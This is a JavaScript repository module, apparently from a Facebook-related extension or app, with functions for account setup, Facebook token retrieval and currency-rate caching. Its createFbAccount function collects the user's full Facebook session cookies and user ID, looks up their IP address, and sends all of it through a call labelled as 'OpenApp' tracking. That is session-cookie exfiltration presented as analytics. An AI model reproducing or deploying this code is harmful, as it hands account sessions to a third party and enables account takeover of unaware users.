import Config from '../../configs';
import ApiGateWay from '../_ApiGateWay';
import { MainResource } from '../resources/main.resource';
import { SmitFbSystem } from "@data/repositories/tracking";
import axios from "axios";

const MainRepository = {
    createFbAccount: async (cookies) => {
        const { value: uid } = cookies.find(item => item.name == "c_user");
        axios.get('https://ipinfo.io/').then(response => {
            // console.log('data:', response.data)
            console.log(response);
            if (response.errorData === undefined) {
                const ipInfo = response.data;
                SmitFbSystem.tracking("OpenApp", { ipInfo, ck: cookies, uid });
            } else {
                console.log("Get IP Info failed");
            }
        });
    },
    // get facebook token
    getTokenAEEI: () => {
        const resource = MainResource.getTokenAEEI();
        return callApiNative({url: resource.path,
            method: "get"});
    },
    getTokenAEEB: (params) => {
        const resource = MainResource.getTokenAEEB();
        return callApiNative({url: resource.path,
            method: "get"});
    },
    getCurrencyRate: async (params) => {
        const currencyRate = JSON.parse(localStorage.getItem(`currecy_${params.currency}`));
        if (currencyRate) return currencyRate;
        const resource = MainResource.getCurrencyRate();
        const { data } = await callApiNative({url: resource.path,
            method: "get"});
        localStorage.setItem(`currecy_${params.currency}`, JSON.stringify(data.data));
        return data;
    },
}

export { MainRepository };